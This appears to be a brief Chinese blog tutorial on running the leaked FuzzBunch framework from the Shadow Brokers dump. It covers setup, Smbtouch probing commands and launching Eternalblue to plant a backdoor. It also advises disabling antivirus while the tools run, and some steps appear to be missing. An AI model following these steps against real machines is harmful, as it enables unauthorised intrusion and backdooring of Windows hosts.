Shadowbroker工具使用方法

发表于 2017-04-26 | 分类于 系统安全

运行环境准备

  1. 安装Python2.6和pywin32，注意Python2.6必须为32位版本；
  2. 在windows利用工具目录下创建listeningposts目录；
  3. 使用Python2.6运行fb.py；

注意事项

多使用help命令查看帮助；
工具使用期间，关闭本机的杀毒软件。

运行

FuzzBunch框架的执行，首先需要配置各个全局变量：

  • 目标ip地址；
  • 本机ip地址；
  • 指示转发选项是否将被使用；
  • 指定log日志目录；
  • 选择或者创建项目；

目标系统漏洞探测

使用Smbtouch插件，使用smb协议来检测对方操作系统版本、架构和可利用的漏洞。
fb > use Smbtouch 使用插件
fb Touch (Smbtouch) > execute 执行插件



攻击

使用Eternalblue插件：
fb Touch (Smbtouch) > use Eternalblue
确定相关的变量，目标ip、端口等：


攻击成功之后会在系统安装一个BackDoor，光有一个后面还不能执行系统命令，需要配合另一个插件。
